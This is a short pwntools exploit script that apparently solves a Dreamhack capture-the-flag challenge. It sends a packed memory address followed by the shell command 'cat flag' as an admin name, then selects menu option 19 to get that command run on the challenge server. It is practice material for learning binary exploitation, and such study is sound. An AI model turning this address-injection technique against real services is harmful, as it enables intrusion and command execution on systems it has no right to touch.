from pwn import *

# context.log_level = "debug"

p = remote("host3.dreamhack.games", 8792)

payload = p32(0x804A0AC + 4) + b"cat flag"
p.sendlineafter(b"Admin name: ", payload)

p.sendlineafter(b"What do you want?: ", b"19")

res = p.recvall()
print(res)
